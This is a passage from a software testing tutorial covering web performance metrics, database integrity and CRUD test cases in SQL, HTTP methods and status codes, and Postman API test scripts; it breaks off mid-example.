- 3-5 seconds: Poor (users get impatient)
- > 5 seconds: Very poor (high bounce rate)

Statistics:
- 53% of mobile users abandon site > 3 seconds
- 1 second delay = 7% reduction in conversions
- Amazon: 100ms delay costs 1% in sales

TEST SCENARIOS:

TC-PERF-001: Homepage load time
Tool: Chrome DevTools → Network tab
Test:
1. Clear cache
2. Open DevTools (F12)
3. Navigate to homepage
4. Note "Load" time at bottom

Expected: < 2 seconds on broadband
Record: Actual time, identify slow resources

TC-PERF-002: Product page load time
Test: Load product page with images

Expected: < 3 seconds
Check: Large images optimized?

TC-PERF-003: Load time on slow connection
Tool: Chrome DevTools → Network → Throttling
Options: Slow 3G, Fast 3G, 4G
Test: Homepage load on Slow 3G

Expected: < 5 seconds on 3G
         < 3 seconds on 4G

TC-PERF-004: Load time after caching
Test:
1. Load page once (warm cache)
2. Reload page
3. Compare times

Expected: Second load much faster
         Static resources cached

TC-PERF-005: Time to First Byte (TTFB)
Measure: Time for first byte from server

Tool: Chrome DevTools → Network → Select resource → Timing tab

Expected: < 600ms (good)
         < 200ms (excellent)

TC-PERF-006: First Contentful Paint (FCP)
Measure: When first content appears

Tool: Lighthouse → Performance

Expected: < 1.8 seconds (good)
         < 1.0 seconds (excellent)

TC-PERF-007: Largest Contentful Paint (LCP)
Measure: When largest content element loads

Tool: Lighthouse

Expected: < 2.5 seconds (good)
         < 1.2 seconds (excellent)

TC-PERF-008: Cumulative Layout Shift (CLS)
Measure: Unexpected layout shifts

Tool: Lighthouse

Expected: < 0.1 (good)
Issue: Images loading cause text to jump

TC-PERF-009: Time to Interactive (TTI)
Measure: When page fully interactive

Tool: Lighthouse

Expected: < 3.8 seconds (good)

TC-PERF-010: Total page weight
Tool: Chrome DevTools → Network → Size column (bottom)

Check:
- Total page size: < 2 MB ideal
- JavaScript: < 500 KB
- Images: < 1 MB total
- CSS: < 100 KB

Expected: Lighter pages load faster

TOOLS:
1. Chrome DevTools (built-in)
2. Lighthouse (built-in Chrome)
3. GTmetrix (online tool)
4. WebPageTest (online tool)
5. Pingdom (online tool)
6. Google PageSpeed Insights

PERFORMANCE WATERFALL ANALYSIS:
1. Open DevTools → Network
2. Reload page
3. Analyze waterfall chart:
   - Identify slow resources
   - Check if resources load in parallel
   - Look for blocking resources
   - Identify render-blocking CSS/JS

Common Issues:
✗ Large uncompressed images
✗ Too many HTTP requests
✗ Render-blocking resources
✗ Slow server response
✗ No browser caching
✗ Unminified CSS/JavaScript
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 2.2 Response Time for User Actions

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
USER ACTION RESPONSE TIME TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RESPONSE TIME THRESHOLDS:
- 0.1 seconds: Feels instantaneous
- 1.0 seconds: User flow uninterrupted
- 10 seconds: User keeps attention

USER PERCEPTION:
< 100ms: Instant
100-300ms: Slight delay, barely noticeable
300ms-1s: Perceptible delay, but acceptable
1-3s: User notices, starts getting impatient
> 3s: User may give up

TEST SCENARIOS:

TC-RESP-001: Button click response
Actions: Submit form, Add to cart, Like post
Test: Time from click to visible response

Expected: < 1 second
         ✓ Loading indicator appears immediately
         ✓ Button disabled during processing

TC-RESP-002: Search results display
Test:
1. Enter search term
2. Measure time to first result appears

Expected: < 2 seconds
Excellent: < 1 second (instant search)

TC-RESP-003: Form submission
Test: Submit registration form

Expected: < 3 seconds to confirmation page
         ✓ Loading spinner during processing

TC-RESP-004: Page navigation
Test: Click menu item, navigate to new page

Expected: < 2 seconds
         ✓ Instant if prefetched
         ✓ Loading indicator if delay

TC-RESP-005: Filter application
Test: Apply filter to product list

Expected: < 1 second (client-side filtering)
         < 2 seconds (server-side filtering)

TC-RESP-006: Sort functionality
Test: Sort products by price

Expected: < 1 second
         ✓ Instant if client-side sorting

TC-RESP-007: Image upload
Test: Upload 5MB image

Expected: Progress bar shows during upload
         < 5 seconds on broadband

TC-RESP-008: Dropdown menu opening
Test: Click dropdown

Expected: < 100ms to open
         ✓ Instant response

TC-RESP-009: Modal dialog opening
Test: Click button to open modal

Expected: < 100ms
         ✓ Smooth animation

TC-RESP-010: Infinite scroll loading
Test: Scroll to bottom, trigger load more

Expected: < 1 second for new items to appear
         ✓ Loading indicator while fetching

TC-RESP-011: Autocomplete suggestions
Test: Type in search box

Expected: Suggestions appear after 2-3 characters
         < 300ms response time
         Updates as typing continues

TC-RESP-012: Adding items to cart
Test: Click "Add to Cart"

Expected: < 500ms
         ✓ Visual feedback (button change, icon animation)
         ✓ Cart counter updates

TC-RESP-013: Video playback start
Test: Click play on video

Expected: < 1 second to start playing
         Buffer indicator if delay

TC-RESP-014: PDF download initiation
Test: Click "Download PDF" button

Expected: < 1 second to start download
         ✓ Browser download prompt appears

TC-RESP-015: Real-time updates
Example: Chat messages, notifications

Expected: < 1 second for new message to appear
         ✓ WebSocket provides instant updates

MEASURING TOOLS:
- Browser DevTools → Network tab
- Performance API (JavaScript)
- User Timing API
- Stopwatch (manual)

JAVASCRIPT PERFORMANCE MEASUREMENT:
```javascript
// Measure specific operation
console.time('searchOperation');
performSearch(query);
console.timeEnd('searchOperation');
// Output: searchOperation: 234.56ms

// Or using Performance API
const start = performance.now();
performOperation();
const end = performance.now();
console.log(`Took ${end - start} milliseconds`);
```

PERFORMANCE OPTIMIZATION INDICATORS:
✓ Loading spinners/skeletons during delays
✓ Immediate visual feedback on clicks
✓ Optimistic UI updates (show result before server confirms)
✓ Caching for repeated actions
✓ Lazy loading for heavy content
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 2.3 Performance Bottleneck Identification

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IDENTIFYING PERFORMANCE BOTTLENECKS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMMON BOTTLENECKS:

1. LARGE IMAGES
Issue: 5MB uncompressed image
Impact: Slow page load
Detection:
- DevTools → Network → Filter by Img
- Check file sizes

Solution indicators:
✓ Images compressed (WebP, optimized JPG)
✓ Responsive images (srcset)
✓ Lazy loading implemented

TC-BOTTLE-001: Image optimization
Check: Any images > 500KB?
Test: Download largest image, check if optimized
Expected: ✓ Compressed
         ✓ Appropriate dimensions

2. RENDER-BLOCKING RESOURCES
Issue: CSS/JS blocks page rendering
Impact: White screen until loaded
Detection:
- Lighthouse → "Eliminate render-blocking resources"
- DevTools → Network → Check request blocking timeline

Solution indicators:
✓ Critical CSS inlined
✓ Non-critical CSS loaded async
✓ JavaScript loaded with defer/async

TC-BOTTLE-002: Render-blocking check
Test: Lighthouse scan
Expected: ✓ No render-blocking CSS/JS OR
         ✓ Minimal blocking (< 100ms)

3. TOO MANY HTTP REQUESTS
Issue: 100+ requests for one page
Impact: Slow load, especially on HTTP/1.1
Detection:
- DevTools → Network → Count requests

Solution indicators:
✓ Resources bundled (CSS, JS combined)
✓ Image sprites used
✓ HTTP/2 enabled (allows multiplexing)

TC-BOTTLE-003: Request count
Test: Count total requests
Expected: < 50 requests ideal
         < 100 acceptable

4. UNMINIFIED RESOURCES
Issue: JavaScript 500KB unminified
Impact: Longer download time
Detection:
- DevTools → Network → Check JS/CSS sizes
- Open file, check if minified (no whitespace/comments)

Solution indicators:
✓ Minified (variable names shortened)
✓ Gzipped (Content-Encoding: gzip)

TC-BOTTLE-004: Minification check
Test: View source of main.js
Expected: ✓ Minified (difficult to read)
         ✓ Compressed

5. SLOW DATABASE QUERIES
Issue: Database query takes 5 seconds
Impact: Slow API responses, page load delays
Detection:
- Backend logs
- Long TTFB in DevTools

Solution indicators:
✓ Database indexes created
✓ Queries optimized
✓ Caching implemented

TC-BOTTLE-005: API response time
Test: DevTools → Network → Check API calls
Expected: < 1 second for most API requests

6. ABSENCE OF CACHING
Issue: Same resources downloaded every time
Impact: Slow repeat visits
Detection:
- DevTools → Network → Disable cache → Reload
- Check "Size" column: "(memory cache)" or "(disk cache)"?

Solution indicators:
✓ Cache-Control headers set
✓ Static resources cached (1 year)
✓ Cache busting for updated resources

TC-BOTTLE-006: Caching verification
Test:
1. Load page (cold cache)
2. Reload page (warm cache)
Expected: ✓ Second load much faster
         ✓ Resources loaded from cache

7. THIRD-PARTY SCRIPTS
Issue: Google Analytics, ads, social widgets slow page
Impact: Delays your content loading
Detection:
- DevTools → Network → Filter by domain
- Identify external domains

Solution indicators:
✓ Third-party scripts loaded async
✓ Non-critical scripts deferred
✓ Hosted locally when possible

TC-BOTTLE-007: Third-party impact
Test: Block third-party domains, reload page
Expected: Check if page loads faster without them

8. JAVASCRIPT EXECUTION TIME
Issue: Heavy JavaScript computation
Impact: Page freezes, unresponsive
Detection:
- DevTools → Performance → Record → Analyze

Solution indicators:
✓ Code optimized
✓ Heavy operations use Web Workers
✓ Debouncing/throttling implemented

TC-BOTTLE-008: JavaScript performance
Test: DevTools → Performance → Record interaction
Expected: ✓ No long tasks (> 50ms)
         ✓ Smooth 60fps

9. MEMORY LEAKS
Issue: JavaScript not releasing memory
Impact: Page slows down over time
Detection:
- DevTools → Memory → Take heap snapshots
- Compare memory usage before/after actions

TC-BOTTLE-009: Memory leak detection
Test:
1. Perform action 100 times (e.g., open/close modal)
2. Check memory usage
Expected: ✓ Memory returns to baseline
         ✗ Memory keeps increasing = leak

10. FONT LOADING
Issue: Custom fonts block text rendering
Impact: Flash of invisible text (FOIT)
Detection:
- Page loads with invisible text briefly

Solution indicators:
✓ font-display: swap set
✓ Fonts preloaded
✓ Font subsetting (only needed characters)

TC-BOTTLE-010: Font rendering
Test: Load page, watch for text appearance
Expected: ✓ Text visible immediately (with system font)
         ✓ Custom font swaps in smoothly

PERFORMANCE PROFILING WORKFLOW:
1. Run Lighthouse audit (identify major issues)
2. Check Network waterfall (find slow resources)
3. Analyze Performance timeline (find long tasks)
4. Check Memory usage (detect leaks)
5. Test on slow connection (amplifies issues)
6. Test on low-end device (CPU bottlenecks)
7. Compare before/after optimizations

REPORTING BOTTLENECKS:
Document:
- What is slow (specific action/page)
- How slow (measurements)
- When it occurs (always, specific conditions)
- Impact (user experience, business)
- Suspected cause (based on analysis)
- Evidence (screenshots, metrics, profiler data)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Database Testing

### 3.1 Data Integrity Testing

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DATABASE DATA INTEGRITY TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-DB-001: Primary key uniqueness
Test: Attempt to insert duplicate primary key

SQL:
INSERT INTO users (id, email) VALUES (1, 'user1@example.com');
INSERT INTO users (id, email) VALUES (1, 'user2@example.com');

Expected: ✗ Second insert fails
         ✓ Error: "Duplicate primary key"

TC-DB-002: Foreign key constraint
Test: Insert record with invalid foreign key

Tables:
- users (id, name)
- orders (id, user_id, amount)

SQL:
INSERT INTO orders (id, user_id, amount) VALUES (1, 999, 100.00);
-- user_id 999 doesn't exist

Expected: ✗ Insert fails
         ✓ Error: "Foreign key constraint violation"

TC-DB-003: NOT NULL constraint
Test: Insert NULL into NOT NULL column

SQL:
INSERT INTO users (id, email, name) VALUES (1, 'test@example.com', NULL);
-- name is NOT NULL

Expected: ✗ Insert fails
         ✓ Error: "NOT NULL constraint violation"

TC-DB-004: Unique constraint
Test: Insert duplicate value in unique column

SQL:
INSERT INTO users (id, email) VALUES (1, 'john@example.com');
INSERT INTO users (id, email) VALUES (2, 'john@example.com');
-- email has UNIQUE constraint

Expected: ✗ Second insert fails
         ✓ Error: "Unique constraint violation"

TC-DB-005: Check constraint
Test: Insert invalid data that violates check constraint

SQL:
-- age column has CHECK (age >= 18)
INSERT INTO users (id, email, age) VALUES (1, 'test@example.com', 15);

Expected: ✗ Insert fails
         ✓ Error: "Check constraint violation"

TC-DB-006: Data type validation
Test: Insert wrong data type

SQL:
INSERT INTO users (id, email, age) VALUES (1, 'test@example.com', 'twenty');
-- age is INT

Expected: ✗ Insert fails
         ✓ Error: "Data type mismatch"

TC-DB-007: Default values
Test: Insert without optional field

SQL:
-- status has DEFAULT 'active'
INSERT INTO users (id, email) VALUES (1, 'test@example.com');
SELECT status FROM users WHERE id = 1;

Expected: ✓ status = 'active' (default applied)

TC-DB-008: Cascading delete
Test: Delete parent record with child records

Tables:
- users (id, name)
- orders (id, user_id) with ON DELETE CASCADE

SQL:
-- User 1 has 3 orders
DELETE FROM users WHERE id = 1;
SELECT * FROM orders WHERE user_id = 1;

Expected: ✓ User deleted
         ✓ All orders for user also deleted

TC-DB-009: Cascading update
Test: Update parent record's referenced field

SQL:
-- ON UPDATE CASCADE
UPDATE users SET id = 100 WHERE id = 1;
SELECT * FROM orders WHERE user_id = 100;

Expected: ✓ User ID updated
         ✓ All order foreign keys updated to 100

TC-DB-010: Transaction rollback
Test: Transaction integrity on error

SQL:
BEGIN TRANSACTION;
INSERT INTO users (id, email) VALUES (1, 'user1@example.com');
INSERT INTO orders (id, user_id, amount) VALUES (1, 1, 100.00);
-- Intentional error:
INSERT INTO orders (id, user_id, amount) VALUES (2, 999, 50.00);
ROLLBACK;

Expected: ✓ All changes rolled back
         ✓ No user or orders inserted

TC-DB-011: Transaction commit
Test: Successful transaction

SQL:
BEGIN TRANSACTION;
INSERT INTO users (id, email) VALUES (1, 'user1@example.com');
INSERT INTO orders (id, user_id, amount) VALUES (1, 1, 100.00);
COMMIT;

Expected: ✓ Both inserts successful
         ✓ Data persists

TC-DB-012: Orphaned records
Test: Check for orphaned records after deletion

Scenario:
1. Delete user
2. Check if orders still reference deleted user

SQL:
DELETE FROM users WHERE id = 1;
SELECT * FROM orders WHERE user_id = 1;

Expected: ✗ No orphaned orders (if CASCADE)
         OR
         ✗ Delete blocked if orders exist (if RESTRICT)

TC-DB-013: Duplicate data prevention
Test: Application-level duplicate check

Scenario: Register with existing email

Expected: ✓ Application checks before INSERT
         ✓ User-friendly error message
         OR
         ✓ Database UNIQUE constraint catches it

TC-DB-014: Data consistency across tables
Test: Related data stays consistent

Example: Order total = sum of order items

SQL:
SELECT orders.total, SUM(order_items.price * order_items.quantity)
FROM orders
JOIN order_items ON orders.id = order_items.order_id
WHERE orders.id = 1
GROUP BY orders.id, orders.total;

Expected: ✓ Order total matches sum of items

TC-DB-015: Precision and scale for decimal
Test: Insert monetary value

SQL:
-- amount DECIMAL(10, 2)
INSERT INTO orders (id, user_id, amount) VALUES (1, 1, 99.999);
SELECT amount FROM orders WHERE id = 1;

Expected: ✓ amount = 100.00 (rounded to 2 decimals)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 3.2 CRUD Operations Validation

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CRUD OPERATIONS TESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CREATE OPERATIONS:

TC-CRUD-001: Insert single record
SQL:
INSERT INTO products (id, name, price)
VALUES (1, 'Laptop', 999.99);

Test:
1. Execute INSERT
2. SELECT to verify

Expected: ✓ Record inserted
         ✓ All fields correct

TC-CRUD-002: Insert multiple records
SQL:
INSERT INTO products (id, name, price) VALUES
(1, 'Laptop', 999.99),
(2, 'Mouse', 29.99),
(3, 'Keyboard', 79.99);

Expected: ✓ All 3 records inserted

TC-CRUD-003: Insert with auto-increment ID
SQL:
INSERT INTO products (name, price)
VALUES ('Monitor', 299.99);
SELECT LAST_INSERT_ID();

Expected: ✓ ID auto-generated
         ✓ Returns new ID

TC-CRUD-004: Insert with NULL optional field
SQL:
INSERT INTO products (id, name, price, description)
VALUES (1, 'Laptop', 999.99, NULL);

Expected: ✓ Inserted successfully
         ✓ description = NULL

TC-CRUD-005: Bulk insert performance
Test: Insert 10,000 records

Expected: ✓ Completes in reasonable time (< 5 seconds)
         ✓ All records inserted correctly

READ OPERATIONS:

TC-CRUD-006: Select all records
SQL:
SELECT * FROM products;

Expected: ✓ All records returned
         ✓ All columns present

TC-CRUD-007: Select specific columns
SQL:
SELECT id, name FROM products;

Expected: ✓ Only requested columns returned

TC-CRUD-008: Select with WHERE clause
SQL:
SELECT * FROM products WHERE price > 100;

Expected: ✓ Only matching records returned

TC-CRUD-009: Select with JOIN
SQL:
SELECT orders.id, users.name, orders.total
FROM orders
JOIN users ON orders.user_id = users.id;

Expected: ✓ Correct data from both tables
         ✓ JOIN executed correctly

TC-CRUD-010: Select with aggregation
SQL:
SELECT category, COUNT(*) as count, AVG(price) as avg_price
FROM products
GROUP BY category;

Expected: ✓ Aggregations correct
         ✓ Grouped appropriately

TC-CRUD-011: Select with sorting
SQL:
SELECT * FROM products ORDER BY price DESC;

Expected: ✓ Results sorted correctly (highest price first)

TC-CRUD-012: Select with pagination
SQL:
SELECT * FROM products LIMIT 10 OFFSET 20;

Expected: ✓ Returns 10 records
         ✓ Skips first 20 records

TC-CRUD-013: Select non-existent record
SQL:
SELECT * FROM products WHERE id = 99999;

Expected: ✓ Empty result set (not error)

UPDATE OPERATIONS:

TC-CRUD-014: Update single record
SQL:
UPDATE products SET price = 899.99 WHERE id = 1;

Test:
1. Execute UPDATE
2. SELECT to verify

Expected: ✓ Record updated
         ✓ Only specified record affected

TC-CRUD-015: Update multiple records
SQL:
UPDATE products SET discount = 10 WHERE category = 'Electronics';

Expected: ✓ All matching records updated
         ✓ Count returned: "5 rows affected"

TC-CRUD-016: Update with calculation
SQL:
UPDATE products SET price = price * 1.1;

Expected: ✓ All prices increased by 10%

TC-CRUD-017: Update non-existent record
SQL:
UPDATE products SET price = 999.99 WHERE id = 99999;

Expected: ✓ No error
         ✓ "0 rows affected"

TC-CRUD-018: Update with JOIN
SQL:
UPDATE orders
JOIN users ON orders.user_id = users.id
SET orders.priority = 'high'
WHERE users.membership = 'premium';

Expected: ✓ Orders updated for premium users only

TC-CRUD-019: Concurrent update handling
Test:
1. User A reads record (price = 100)
2. User B reads same record (price = 100)
3. User A updates price to 110
4. User B updates price to 120

Expected: Depends on implementation:
✓ Last write wins (price = 120) OR
✓ Optimistic locking prevents B's update

DELETE OPERATIONS:

TC-CRUD-020: Delete single record
SQL:
DELETE FROM products WHERE id = 1;

Expected: ✓ Record deleted
         ✓ "1 row affected"

TC-CRUD-021: Delete multiple records
SQL:
DELETE FROM products WHERE price < 10;

Expected: ✓ All matching records deleted

TC-CRUD-022: Delete all records
SQL:
DELETE FROM temp_data;
or
TRUNCATE TABLE temp_data;

Expected: ✓ All records deleted
Note: TRUNCATE faster but can't be rolled back in transaction

TC-CRUD-023: Delete non-existent record
SQL:
DELETE FROM products WHERE id = 99999;

Expected: ✓ No error
         ✓ "0 rows affected"

TC-CRUD-024: Soft delete
SQL:
UPDATE products SET deleted_at = NOW() WHERE id = 1;
-- Later queries: WHERE deleted_at IS NULL

Expected: ✓ Record marked deleted, not physically removed

TC-CRUD-025: Delete with foreign key constraint
SQL:
DELETE FROM users WHERE id = 1;
-- Orders reference this user

Expected: Depends on FK setting:
✗ Error if RESTRICT
✓ Cascades if CASCADE
✓ Sets NULL if SET NULL

VALIDATION:

TC-CRUD-026: Database vs Application data
Test:
1. Create record via application
2. Query database directly
3. Compare data

Expected: ✓ Data matches exactly

TC-CRUD-027: Timestamps
Test: Create/update record

Expected: ✓ created_at set automatically
         ✓ updated_at updates on modification

TC-CRUD-028: Audit logging
Test: Perform CRUD operations

Expected: ✓ Audit table logs all changes
         ✓ Logs: user, action, timestamp, old/new values
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## API Testing Fundamentals

### 4.1 Understanding REST APIs

**REST:** Representational State Transfer

**Key Concepts:**
```
Resources: Entities (users, products, orders)
Endpoints: URLs to access resources (/api/users, /api/products)
HTTP Methods: Actions on resources (GET, POST, PUT, DELETE)
Stateless: Each request independent (contains all needed info)
JSON: Common data format
```

**REST API Principles:**
```
1. Client-Server: Separation of concerns
2. Stateless: Server doesn't store client state
3. Cacheable: Responses can be cached
4. Uniform Interface: Consistent URL structure
5. Layered System: Client doesn't know if talking to server or intermediary
```

---

### 4.2 HTTP Methods

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HTTP METHODS (VERBS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

GET - Retrieve data
Purpose: Read/retrieve resource
Example: GET /api/users/123
Returns: User data with ID 123
Body: No body in request
Safe: Yes (doesn't modify data)
Idempotent: Yes (same result every time)

POST - Create new resource
Purpose: Create new resource
Example: POST /api/users
Body: {"name": "John", "email": "john@example.com"}
Returns: Created user with ID
Safe: No (modifies data)
Idempotent: No (creates new resource each time)

PUT - Update/replace resource
Purpose: Update entire resource or create if doesn't exist
Example: PUT /api/users/123
Body: {"name": "John Updated", "email": "john@example.com"}
Returns: Updated user
Safe: No
Idempotent: Yes (same result if called multiple times)

PATCH - Partial update
Purpose: Update specific fields
Example: PATCH /api/users/123
Body: {"email": "newemail@example.com"}
Returns: Updated user
Safe: No
Idempotent: Yes (usually)

DELETE - Remove resource
Purpose: Delete resource
Example: DELETE /api/users/123
Returns: Success message or empty response
Safe: No
Idempotent: Yes (delete once or multiple times, same result)

HEAD - Get headers only
Purpose: Same as GET but only returns headers (no body)
Example: HEAD /api/users/123
Use case: Check if resource exists without downloading it

OPTIONS - Get supported methods
Purpose: Discover what methods supported
Example: OPTIONS /api/users
Returns: Allowed methods (GET, POST, PUT, DELETE)
Use case: CORS preflight requests

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**CRUD Mapping:**
```
CREATE → POST
READ   → GET
UPDATE → PUT / PATCH
DELETE → DELETE
```

---

### 4.3 HTTP Status Codes

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HTTP STATUS CODES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1XX - INFORMATIONAL
100 Continue: Server received request headers, client can send body
102 Processing: Server processing request (may take a while)

2XX - SUCCESS
200 OK: Request successful, response contains data
201 Created: Resource created successfully (POST)
202 Accepted: Request accepted, processing not complete
204 No Content: Request successful, no content to return (DELETE)

3XX - REDIRECTION
301 Moved Permanently: Resource moved to new URL permanently
302 Found: Resource temporarily at different URL
304 Not Modified: Resource not changed, use cached version

4XX - CLIENT ERRORS (Your fault)
400 Bad Request: Invalid request syntax or parameters
401 Unauthorized: Authentication required or failed
403 Forbidden: Authenticated but not authorized
404 Not Found: Resource doesn't exist
405 Method Not Allowed: HTTP method not supported for endpoint
409 Conflict: Request conflicts with current state (duplicate)
422 Unprocessable Entity: Syntax correct but semantically invalid
429 Too Many Requests: Rate limit exceeded

5XX - SERVER ERRORS (Server's fault)
500 Internal Server Error: Generic server error
502 Bad Gateway: Invalid response from upstream server
503 Service Unavailable: Server temporarily unavailable
504 Gateway Timeout: Upstream server timeout

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TESTING STATUS CODES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TC-STATUS-001: Successful GET request
Request: GET /api/users/123
Expected: 200 OK
Body: User data

TC-STATUS-002: GET non-existent resource
Request: GET /api/users/99999
Expected: 404 Not Found
Body: {"error": "User not found"}

TC-STATUS-003: Successful POST request
Request: POST /api/users
Body: {"name": "John", "email": "john@example.com"}
Expected: 201 Created
Body: Created user with ID
Header: Location: /api/users/123

TC-STATUS-004: POST with invalid data
Request: POST /api/users
Body: {"name": "", "email": "invalid"}
Expected: 400 Bad Request OR 422 Unprocessable Entity
Body: {"errors": ["Name required", "Invalid email"]}

TC-STATUS-005: POST duplicate resource
Request: POST /api/users
Body: {"email": "existing@example.com"}
Expected: 409 Conflict
Body: {"error": "Email already exists"}

TC-STATUS-006: Successful PUT request
Request: PUT /api/users/123
Body: {"name": "John Updated", "email": "john@example.com"}
Expected: 200 OK
Body: Updated user

TC-STATUS-007: PUT non-existent resource
Request: PUT /api/users/99999
Body: {"name": "John", "email": "john@example.com"}
Expected: 404 Not Found OR 201 Created (if API creates missing resources)

TC-STATUS-008: Successful DELETE request
Request: DELETE /api/users/123
Expected: 204 No Content OR 200 OK
Body: Empty OR success message

TC-STATUS-009: DELETE non-existent resource
Request: DELETE /api/users/99999
Expected: 404 Not Found OR 204 No Content (idempotent)

TC-STATUS-010: Unauthorized request
Request: GET /api/users (no auth token)
Expected: 401 Unauthorized
Header: WWW-Authenticate: Bearer realm="API"

TC-STATUS-011: Forbidden request
Request: DELETE /api/admin/users (non-admin user)
Expected: 403 Forbidden
Body: {"error": "Insufficient permissions"}

TC-STATUS-012: Method not allowed
Request: DELETE /api/users (if DELETE not supported)
Expected: 405 Method Not Allowed
Header: Allow: GET, POST, PUT

TC-STATUS-013: Rate limit exceeded
Request: 100 requests in 1 minute (if limit is 60/min)
Expected: 429 Too Many Requests
Header: Retry-After: 60

TC-STATUS-014: Server error
Request: Any request when server has error
Expected: 500 Internal Server Error
Body: {"error": "An error occurred"}
Note: Should NOT expose internal details

TC-STATUS-015: Service unavailable
Request: Any request during maintenance
Expected: 503 Service Unavailable
Header: Retry-After: 3600

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 4.4 API Testing with Postman

**Postman:** Popular API testing tool

**Getting Started:**
```
1. Download Postman: www.postman.com
2. Create account (optional, but recommended)
3. Create new Collection: "E-Commerce API Tests"
4. Add requests to collection
```

**Complete API Testing Example:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
POSTMAN API TESTING - COMPLETE EXAMPLE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API: https://api.example.com

TEST 1: GET all users
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: GET
URL: https://api.example.com/api/users
Headers:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  Content-Type: application/json

Response:
Status: 200 OK
Time: 234ms
Body:
{
  "data": [
    {
      "id": 1,
      "name": "John Doe",
      "email": "john@example.com",
      "created_at": "2026-01-01T10:00:00Z"
    },
    {
      "id": 2,
      "name": "Jane Smith",
      "email": "jane@example.com",
      "created_at": "2026-01-02T11:00:00Z"
    }
  ],
  "total": 2,
  "page": 1,
  "per_page": 10
}

TESTS (JavaScript in Postman):
```javascript
// Test status code
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

// Test response time
pm.test("Response time < 500ms", function () {
    pm.expect(pm.response.responseTime).to.be.below(500);
});

// Test response structure
pm.test("Response has data array", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData).to.have.property('data');
    pm.expect(jsonData.data).to.be.an('array');
});

// Test data content
pm.test("Each user has required fields", function () {
    const jsonData = pm.response.json();
    jsonData.data.forEach(user => {
        pm.expect(user).to.have.property('id');
        pm.expect(user).to.have.property('name');
        pm.expect(user).to.have.property('email');
    });
});
```

TEST 2: GET single user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: GET
URL: https://api.example.com/api/users/1
Headers:
  Authorization: Bearer {{auth_token}}
  Content-Type: application/json

Response:
Status: 200 OK
Body:
{
  "data": {
    "id": 1,
    "name": "John Doe",
    "email": "john@example.com",
    "created_at": "2026-01-01T10:00:00Z"
  }
}

TESTS:
```javascript
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

pm.test("User ID matches requested ID", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data.id).to.eql(1);
});

pm.test("Email format is valid", function () {
    const jsonData = pm.response.json();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    pm.expect(jsonData.data.email).to.match(emailRegex);
});

// Save user ID for later tests
pm.environment.set("user_id", pm.response.json().data.id);
```

TEST 3: GET non-existent user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: GET
URL: https://api.example.com/api/users/99999
Headers:
  Authorization: Bearer {{auth_token}}

Response:
Status: 404 Not Found
Body:
{
  "error": "User not found"
}

TESTS:
```javascript
pm.test("Status code is 404", function () {
    pm.response.to.have.status(404);
});

pm.test("Error message present", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData).to.have.property('error');
});
```

TEST 4: POST create new user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Method: POST
URL: https://api.example.com/api/users
Headers:
  Authorization: Bearer {{auth_token}}
  Content-Type: application/json
Body (JSON):
{
  "name": "Test User",
  "email": "test{{$timestamp}}@example.com",
  "password": "SecurePass123!"
}

Response:
Status: 201 Created
Body:
{
  "data": {
    "id": 3,
    "name": "Test User",
    "email": "test1735678900@example.com",
    "created_at": "2026-01-10T15:30:00Z"
  }
}

TESTS:
```javascript
pm.test("Status code is 201", function () {
    pm.response.to.have.status(201);
});

pm.test("User created with ID", function () {
    const jsonData = pm.response.json();
